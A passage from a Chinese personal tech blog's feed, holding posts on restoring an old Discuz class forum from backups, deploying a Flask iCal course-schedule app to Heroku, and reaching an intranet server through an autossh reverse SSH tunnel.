alt=""></p><ul><li>安装完成，访问主页是默认的界面。（略）</li><li>根据官方的搬家教程，把<code>utility/restore.php</code>文件上传到网站的<code>data/</code>目录下，再把要恢复的数据库整个目录也上传到<code>data/</code>下，然后通过<code>网站域名/data/restore.php</code>访问数据恢复页面。</li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot2.png" alt=""></p><blockquote><p>然而这里我被自己的WAF给拦住了233。</p><p>开了白名单再导入，这时候过了一段时间报<strong>504</strong>了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤  </p><p>重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。</p></blockquote><blockquote><p>搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504…  </p><p>看了一下<code>.sql</code>文件，干脆不用整个工具，直接导入mysql好了啦。  </p><p>虽然期间还报了几个错，但还是导完了呢。</p></blockquote><ul><li><p>访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。</p></li><li><p>用原始的创始人账号登录后台，<strong>更新缓存</strong>。</p><blockquote><p>这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。</p><p>毕竟整个数据库都改回去了嘛。</p><p>至于忘记密码，emmm后面再说。</p></blockquote></li><li><p>再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-17-56-47-58.jpg" style="max-width:40%;"></li><li><p>（如果有的话）<strong>恢复logo、favicon、attachment、avatar、plugin、template等。</strong></p><p>这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-02-23-26-12.png" alt="恢复后的班网" style="max-width:50%;"></li></ul><p>看了看上面的帖子，<em>全是黑历史啊</em>……（黑脸.png</p><p>用户数据都恢复了，理论上能用原来的信息进行登录。</p><p>然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。</p><p><strong>不过能重建了也总比没有要好呀！嘻嘻嘻。</strong></p><p>毕竟这个版本有很多安全漏洞了，<strong>出于安全考虑，这里就不公开了啦</strong>。</p><p><br><br></p><hr><br><h3 id="重建10班班网"><a href="#重建10班班网" class="headerlink" title="重建10班班网"></a>重建10班班网</h3><p>上面说了云平台<code>End of Life</code>的时候没有备份这个数据的。</p><p>但是我找遍了硬盘，终于<strong>翻出了那时候备份的部分数据</strong>。</p><p>有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。  </p><p>首先还是版本的问题。</p><p>本以为<code>X3.2</code>版本已经够老了，没想到这里最后一直回退到了<strong><code>X2</code>版本</strong>（噗</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot3.png" alt="安装过的版本"></p><p><strong><em>鬼懂得我重建了多少次网站emmmm</em></strong></p><ul><li>期间有一次是<strong>PHP版本错了</strong>，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。</li></ul><ul><li>有一次是<strong>MySQL数据库炸了</strong>，装完之后主页都打不开，直接报的<code>database error</code>。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。</li></ul><ul><li>还有一次是<strong>Discuz版本</strong>装的<code>X2.5</code>，本来挺开心的，导完数据更新完缓存，点开帖子就报<code>database error</code>，说找不到某某记录吧。最后版本降到<code>X2</code>终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。</li></ul><ul><li>还有每一次都遇到了<strong><code>.sql</code>导不进数据库</strong>的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了</li></ul><ul><li><p>噢还有那个<strong>创始人密码忘了</strong>的问题。</p><p>查了一下资料，一个方案是尝试登录<code>UC_Center</code>，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录<code>Discuz</code>的管理后台就行了。（这里用的就是这个方案）</p><p>另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。</p></li></ul><hr><p><strong>重建完成之后访问主页。</strong></p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-23-23-25-80.png" alt=""></p><p>草，原来这个是那时候<strong>更新版本前的最后一次备份</strong>emmm</p><p>（看亚子是第四代，最后更新的是第五代了，看了半天才想起来）</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot4.png" alt="10班班网重建"></p><p>找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。</p><p>于是乎最后重建出来的是2013年1月的备份了。</p><p>怎么说好呢，其实问题也不大吧，<strong>真·回忆啊！</strong></p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-01-57-55-85.jpg" style="max-width:50%;"><p>这个版本的安全漏洞更多了，同样就<strong>不公开了，看看就好了啦</strong>。</p><p><br><br></p><p>emmm下面这个是<strong>恢复不了的第五代版本</strong>（真就只有这张图了嘤嘤嘤）。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="第五代班网" style="max-width:50%;"><p><br><br></p><hr><p><br><br></p><h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol><li><p>Linux权限管理还是很严格的，这回体验到了，有空再研究研究。</p><br></li><li><p>选对合适的版本，不要总想着用最新的。</p><br></li><li><p>看了<code>Discuz!</code>系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。</p><p>包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。</p><br></li><li><p>去<code>Discuz!</code>官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_plugin.png" alt="部分之前备份的插件"></p><br></li><li><p>其实还找到了以前可能折腾过的各种建站系统233。</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_websystem.png" alt="可能折腾过的各种建站系统"></p><br></li><li><p>然后就想到<strong>纸飞机</strong>了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过</p><br></li><li><p>写这篇blog的时候又去<code>OpenShift</code>看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的<code>Serverless</code>、 <code>CI/CD</code>之类的，现在的<code>Starter plan</code>也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。</p></li></ol><blockquote><p>版本介绍：<a href="https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/" target="_blank" rel="noopener">https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/</a></p><p>产品介绍：<a href="https://www.openshift.com/products/online/" target="_blank" rel="noopener">https://www.openshift.com/products/online/</a></p></blockquote><p>​        <br></p><ol start="8"><li><p>备份是个好习惯，<strong>CTRL+S</strong>也是。</p><br></li><li><p>看了看之前的帖子，发现全都是黑历史……</p><p>然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。</p><p>等我有空再把上面以前发的文章爬下来备份一份23333.</p><br></li><li><p>有问题欢迎来交流哈哈哈。</p></li></ol><p>溜了溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Discuz </tag>
            
            <tag> 班网 </tag>
            
            <tag> 重建 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAA_iCal_Web在线版本部署</title>
      <link href="/2019/12/29/Tech_NUAAiCalWeb_deploy/"/>
      <url>/2019/12/29/Tech_NUAAiCalWeb_deploy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了…</p><p>（其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤  </p></blockquote><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 <code>NUAA_ClassSchedule</code><br>GitHub链接：<a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">click here</a><br><a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_ClassSchedule</a>  </p><p>其中有一个TODO是搭建一个web端，实现在线导出。</p><p>实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。</p><p>然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。</p><p>解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。</p><p>不过web端就有点麻烦了。</p><p>但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。</p><blockquote><p>其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵</p></blockquote><p><strong>不想往下看又想体验<code>NUAA_iCal_Web</code>在线版本的，<a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">点这里</a>访问吧。</strong>   </p><p><br><br></p><hr><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><h3 id="Heroku简介"><a href="#Heroku简介" class="headerlink" title="Heroku简介"></a><em>Heroku</em>简介</h3><p>偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个<code>deploy with heroku</code>之类的图标按钮。点进去看了看，然后再查了查资料。</p><blockquote><p><em>Heroku</em> is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.  </p></blockquote><blockquote><p>Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。</p></blockquote><p>好东西呀！</p><p>发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。  </p><blockquote><p>其实那时候我连wsgi是啥都不知道……  </p></blockquote><p>官网链接：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>具体的定价策略参见<a href="https://www.heroku.com/pricing" target="_blank" rel="noopener">这里</a>。  </p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/price.png" alt="price">  </p><p>Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。  </p><p><strong>对于nuaaical来说，这个完全够用了呢！</strong>  </p><p>那就干脆折腾一下好了。  </p><p><br><br></p><h3 id="NUAA-iCal-Web端搭建"><a href="#NUAA-iCal-Web端搭建" class="headerlink" title="NUAA iCal Web端搭建"></a>NUAA iCal Web端搭建</h3><p>需要一个wsgi接口之类的嘛，flask、django这些现成的就行。</p><p>本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下<strong>flask框架</strong>。</p><p>然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了  </p><p>实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。</p><p>不过这个<strong>验证码</strong>折腾了老半天。</p><p>这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。</p><p>当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，<br>进而爬取课表及考试信息，<br>生成icalendar日历文件，<br>而后以附件下载的形式构造response，从而得到属于你的ical课表。  </p><br><p>当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。</p><p>（这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。</p><p>其实到这的话，本地搭建就结束了。</p><hr><p>不过还考虑了一下<strong>复杂的生产环境</strong>……  </p><ul><li><p>比如说<strong>登录信息重复post</strong>，而原来的验证码就不再有效了。</p><p>这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233</p><p><strong>（有更好的方案欢迎提出喵！</strong></p></li><li><p>比如<strong>未登录情况下直接访问导出ical的页面</strong>  </p><p>这个也是直接返回主页了。不过这里这个判断折腾了老半天。</p><p>最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。</p><blockquote><p>之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。   </p><p>还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。</p></blockquote></li><li><p>教务系统<strong>连接已重置</strong></p><p>这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。  </p><p>又改了改登录的延时，这回变成随机延时了，而且时间也加长了。  </p><p>而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。   </p><p>问题有所改善…然而偶尔还存在。</p><p><strong>大不了多试几次就好了。</strong></p></li><li><p>etc.</p></li></ul><blockquote><p>其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。<br>再说吧……</p></blockquote><br><hr><br><h3 id="Heroku搭建"><a href="#Heroku搭建" class="headerlink" title="Heroku搭建"></a>Heroku搭建</h3><p>下面来简单记录一下Heroku的部署。</p><ol><li><p><strong>注册一个账号</strong></p><p>网址<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>略。建议用gmail，不过也看到用国内邮箱也成功的。  </p></li></ol><ol start="2"><li><p><strong>安装Heroku CLI 命令行接口</strong></p><p>Win-x64：<a href="https://cli-assets.heroku.com/heroku-x64.exe" target="_blank" rel="noopener">下载地址</a></p><p>其他环境的见官网好了。<a href="https://devcenter.heroku.com/articles/heroku-cli" target="_blank" rel="noopener">https://devcenter.heroku.com/articles/heroku-cli</a></p><p>安装完之后就可以在命令行用<code>heroku</code>命令了。</p></li></ol><ol start="3"><li><p><strong>登录</strong></p><pre class=" language-bash"><code class="language-bash">heroku login</code></pre><p>会弹出网页登录验证，或者在命令行登录。</p></li></ol><ol start="4"><li><p><strong>准备好app</strong></p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229023615517.png" alt="支持的app"></p><p>你看他支持的语言挺多的呢。</p><p>我这里用到的就是python啦。</p><p>这个在上一节已经搭建好了喵。</p></li></ol><ol start="5"><li><p><strong>创建app</strong></p><pre class=" language-bash"><code class="language-bash">heroku create</code></pre><p>这时候同时建立了一个名为<code>heroku</code>的git remote仓库，连接到了你本地的git仓库。</p><p>当然也可以现在网站上创建一个应用，再clone</p><pre class=" language-bash"><code class="language-bash">heroku git:clone -a nuaaical<span class="token function">cd</span> nuaaical</code></pre><p>这里前提是建立好了名为<code>nuaaical</code>的应用了。</p></li><li><p><strong>建立依赖相关的<code>requirements.txt</code></strong></p><p>略。</p></li></ol><ol start="7"><li><p><strong>指定执行的入口</strong></p><p><strong>这里算是一个坑吧，折腾了好久才发现。</strong></p><p>你必须先在代码目录下建立一个名为<code>Procfile</code>的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。</p><p>在这里用的是<code>gunicorn</code>来建立一个web应用。（flask只用于本地测试使用</p><pre><code>web: gunicorn web:app</code></pre><p>第二个<code>web</code>是文件名（<code>web.py</code>），<code>app</code>是flask实例化的对象啦。<br>（代码里写的<code>app = Flask(__name__)</code>  </p></li></ol><ol start="8"><li><p><strong>指定用构建语言（可略？）</strong></p><pre class=" language-bash"><code class="language-bash">heroku buildpacks:set heroku/python</code></pre><p>显示指定用python来构建打包（网上有的说不指定会报错？</p></li></ol><ol start="9"><li><p><strong>部署代码</strong></p><p>终于可以部署了呀！直接push好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push heroku master</code></pre><p>如果不行的话加上<code>-f</code>强制push<strong>（小心一点）</strong>。</p><p>然后可以看到部署的日志，如果有问题就再看看。</p><p>没问题的话，效果类似下面的。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/push.png" alt="push"></p></li></ol><ol start="10"><li><p><strong>看看你的网站吧</strong></p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">open</span></code></pre><p>然后会调用你的浏览器打开。</p><p>或者自己在浏览器访问就好了。</p></li></ol><p><strong>嘻嘻嘻，到这就结束啦~</strong></p><p><br><br></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>当然还有一些<strong>常用命令</strong>，比如：</p><ul><li><p>查看日志<strong>(debug必备了)</strong></p><pre class=" language-bash"><code class="language-bash">heroku logs --tail</code></pre></li><li><p>看一下还有多少剩余时长</p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">ps</span></code></pre></li><li><p>打开app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>1</code></pre></li><li><p>关闭app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>0</code></pre></li><li><p>etc.</p></li></ul><blockquote><p>官方文档<code>Getting Started on Heroku</code>看这里 <a href="https://devcenter.heroku.com/start" target="_blank" rel="noopener">https://devcenter.heroku.com/start</a></p></blockquote><p><br><br></p><p>除此以外，Heroku还支持<code>pipeline</code>，还可以授权从GitHub上同步部署，还有容器啥的……</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229033131933.png" alt=""></p><p>感觉还是挺不错的呢！  </p><p><br><br></p><hr><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><p>部署好的web端网址：</p><p><a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">https://nuaaical.herokuapp.com/</a></p><p><strong>欢迎来试试呀！</strong></p><p>第一次访问可能会花一些时间，等一等吧。</p><p>如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。</p><p>同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend.png" alt="前端"></p><blockquote><p>好了我知道这个页面丑了。现学的HTML，别说了。</p><p>其实之前奶冰奶冰奶冰冰做了一个前端的↓ </p><p>后面再折腾吧咕咕咕</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend_vue.png" alt="vue.js前端"></p><p><strong>欢迎来贡献代码呀！</strong></p></blockquote><blockquote><p>其实之前还折腾了老半天，尝试了<strong>在Azure上部署</strong>，也成功了。</p><p>需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_deploy.png" alt="Azure_deploy"></p><p>不过现在Azure服务到期了。部署的网站也停止了呢。</p><p>截个图纪念一下吧。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_website.png" alt="Azure_website"></p><p>（hackathon的时候白嫖的Azure还是挺爽的233  </p></blockquote><p>同时，<strong>代码开源在GitHub上了。欢迎来点个star，提个PR喵！</strong>   </p><p><a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_iCal_Web</a></p><p><br><br></p><p><strong><em>仅供学习研究，未经允许禁止商用，谢谢。</em></strong></p><p>文章中不免存在问题，欢迎提出。  </p><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://devcenter.heroku.com/" target="_blank" rel="noopener">https://devcenter.heroku.com/</a></li><li><a href="https://www.jianshu.com/p/191248ad2639" target="_blank" rel="noopener">https://www.jianshu.com/p/191248ad2639</a></li></ol><p><br><br></p><blockquote><p>浪够了，继续准备考试。（真难顶……</p><p>期末冲冲冲！</p><p>说不定这是今年最后一篇blog了喵。</p><p>溜了溜了。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Web </tag>
            
            <tag> iCal </tag>
            
            <tag> Heroku </tag>
            
            <tag> Deployment </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于VSCode和ssh实现远程编程/炼丹</title>
      <link href="/2019/12/21/Idea_RemoteProgramming/"/>
      <url>/2019/12/21/Idea_RemoteProgramming/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 <code>Teamviewer</code> 速度还可以，但总感觉有点不太爽……  </p><p>很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以</p><blockquote><p><strong>使用vscode进行远程炼丹</strong>  <em>（原文见 Reference #1</em></p></blockquote><p>噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾<del>（其实现在也没空）</del>，就是前几天在配服务器环境的时候<del>（麻烦到爆炸，最讨厌配环境了）</del>，一想干脆就再折腾一下，弄好远程炼丹（编程）吧。  </p><p>于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，<strong>贼有成就感嘻嘻嘻</strong>。</p><p>其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。</p><p>时间有限，VSCode的部分就大概提一下思路，<strong>重点是<code>ssh</code>的部分</strong>吧……   </p><h2 id="Guidance-for-ssh"><a href="#Guidance-for-ssh" class="headerlink" title="Guidance for ssh"></a>Guidance for ssh</h2><p>不妨假设如下，<strong>记清楚了噢，后面频繁用到的</strong>。</p><table><thead><tr><th>computer</th><th>IP/address</th><th>info</th></tr></thead><tbody><tr><td>内网服务器A</td><td>172.x.x.x</td><td>可以访问外网，但外网不能直接访问A</td></tr><tr><td>公网服务器B</td><td>test.com</td><td>可以访问外网，也可被外网访问</td></tr><tr><td>能够联网的主机C</td><td>-</td><td>想要在C上对A进行访问</td></tr></tbody></table><h3 id="内网服务器A上的设置"><a href="#内网服务器A上的设置" class="headerlink" title="内网服务器A上的设置"></a>内网服务器A上的设置</h3><p>A设置反向代理到B的 port1 端口  </p><blockquote><p>工作原理：<br>1、本地主机和远程主机建立连接；<br>2、远程主机上分配了一个 socket 侦听 port 端口；<br>3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。   </p><p>备注：root 登录远程主机才能转发特权端口。</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com -p 22</code></pre><blockquote><p>-R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。<br><code>usr_b@test.com</code> 用户名@服务器B地址，表示连接到B，以用户<code>usr_b</code>登录。当然<code>test.com</code>也可以是IP地址啦。<br>-f SSH客户端在后台运行<br>-C 允许压缩<br>-g 允许远程主机可远程访问，这里有坑。  （但<code>autossh</code>没有这个选项所以应该影响不大）<br>-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。<br>-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。   </p></blockquote><p>注意一下，<em>（网上说）</em>这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。</p><pre class=" language-bash"><code class="language-bash">＃vim /etc/ssh/sshd_config 新增GatewayPorts <span class="token function">yes</span></code></pre><hr><h4 id="进阶1-autossh"><a href="#进阶1-autossh" class="headerlink" title="进阶1  autossh"></a><strong>进阶1  autossh</strong></h4><p>由于ssh会自动断开连接，于是<strong>利用自动重连工具<code>autossh</code>，保证连接稳定</strong>。</p><p>首先安装autossh，这里我用的是CentOS系统。其他类似的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> yum -y <span class="token function">install</span> autossh</code></pre><blockquote><p>其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的…</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">screen</span> -S reverse_proxyautossh -M <span class="token operator">&lt;</span>port2<span class="token operator">></span> -CNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com</code></pre><p>多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。  </p><p>这里的screen用于命令行终端切换，给这个界面起了个名叫<code>reverse_proxy</code>，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。</p><p><strong>注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。</strong>  </p><p>而后看一下有没有运行↓</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021730475.png" alt="看一下进程"></p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220022409722.png" alt="netstat看一下"></p><p>可见A已和B建立连接。<br>此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。  </p><hr><h4 id="进阶2-开机自启"><a href="#进阶2-开机自启" class="headerlink" title="进阶2  开机自启"></a><strong>进阶2  开机自启</strong></h4><p>当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下<strong>开机自动启动autossh</strong>。</p><p>有一种方法是在<code>/etc/rc.local</code>里面添加如下内容</p><pre class=" language-bash"><code class="language-bash"><span class="token function">su</span> - user_a -c <span class="token string">"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com"</span></code></pre><p>其中，<code>-i</code>后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为<code>/root/.ssh/id_rsa</code>。<br><code>user_a</code>是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥<em>（这个在下面B的设置中介绍）</em>。</p><p>然后记得给这个文件赋予<strong>可执行</strong>权限。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x /etc/rc.d/rc.local</code></pre><p>不过看这个文件注释里的说法，好像这个方法不推荐了。  </p><p>当然<strong>还可以使用其他的配置开机自启的方法</strong>，我也刚折腾对Linux也不熟，后面再看看吧。  </p><p>现在你可以<code>reboot</code>试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。   </p><p>这样A上的设置就告一段落了，下面看公网服务器B。  </p><hr><h3 id="公网服务器B上的设置"><a href="#公网服务器B上的设置" class="headerlink" title="公网服务器B上的设置"></a>公网服务器B上的设置</h3><p>如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在<strong>直接ssh就完事了</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>因为已经把A的ssh对应的22端口映射到B的port1端口了呀！  </p><p>试一下果然如此。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220023008851.png" alt="在B上ssh连接A"></p><h4 id="进阶-免密登录"><a href="#进阶-免密登录" class="headerlink" title="进阶  免密登录"></a>进阶  免密登录</h4><p>这样每次登录都需要输入密码，是有点麻烦了。</p><p>这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的<code>~/.ssh/authorized_key</code>文件中，实现免密登录。</p><p>什么，你还觉得太麻烦了？？？</p><p>这里还有一个快办法，就是在B上登录A后执行这个——</p><pre class=" language-bash"><code class="language-bash">ssh-copy-id -i .ssh/id_rsa.pub  usr_a@172.x.x.x</code></pre><blockquote><p>-i 指向本地的公钥文件，一般在用户的目录下。<br><code>usr_a</code> 为A上要登录的用户名</p></blockquote><p>然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！  </p><hr><h3 id="在任意一台联网主机C对A进行访问的实现"><a href="#在任意一台联网主机C对A进行访问的实现" class="headerlink" title="在任意一台联网主机C对A进行访问的实现"></a>在任意一台联网主机C对A进行访问的实现</h3><p>到这里我有点成就感了，<strong>远程炼丹实际上已经实现了</strong>。  